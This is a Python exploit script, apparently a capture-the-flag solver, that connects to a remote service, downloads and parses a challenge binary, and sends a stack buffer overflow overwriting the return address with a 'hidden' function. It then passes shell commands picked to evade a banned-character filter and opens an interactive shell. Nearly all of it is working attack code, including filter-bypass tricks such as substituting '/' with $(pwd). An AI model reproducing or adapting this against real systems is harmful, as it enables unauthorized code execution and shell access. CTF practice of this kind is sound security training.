from ptrlib import *
import base64
import time

command = b'ed'
command = b'$SHELL'
command = b'$PATH\nls\ned'

while True:
    sock = Socket("115.68.235.72", 5252)

    binary = base64.b64decode(sock.recvuntil("\n\n"))
    flag = sock.recvline().split(b' : ')[1]
    with open("a.out", "wb") as f:
        f.write(binary)

    elf = ELF("./a.out")

    ofs = binary.index(b'\xa1' + p32(elf.symbol('check')))
    depth = u32(binary[ofs-4:ofs])
    ofs = binary.index(b'\x50\x6a\x00')
    size = u32(binary[ofs-10:ofs-6])
    ofs = next(elf.find('gogo : \0')) + 8
    while binary[ofs] == 0:
        ofs += 1
    banned = binary[ofs:binary.index(b'\0', ofs)]

    logger.info("buffer size = " + hex(depth))
    logger.info("read size = " + hex(size))
    logger.info(b"banned characters = " + banned)
    logger.info(b"path = " + flag)
    #command = b'dd<' + flag
    command = b'$0'
    #command = b'od<' + flag[1:]
    """
    if b'/' in banned:
        if b'{' in banned or b'}' in banned:
            if b'`' in banned:
                command = command.replace(b'/', b'$(pwd)')
            else:
                command = command.replace(b'/', b'`pwd`')
        else:
            command = command.replace(b'/', b'${PWD}')
    """
    
    is_ok = True
    for c in command:
        if c in banned:
            is_ok = False
            print(chr(c))
    
    if size >= depth + 8 and is_ok:
        payload = b'A' * depth
        payload += b'BBBB'
        payload += p32(elf.symbol('hidden'))
    else:
        logger.error("Bad luck!")
        sock.close()
        continue
    
    sock.sendafter(": ", payload)
    time.sleep(0.1)
    sock.sendafter("!!", command)
    time.sleep(0.1)
    sock.sendline("!/bin/sh")

    sock.interactive()
    break
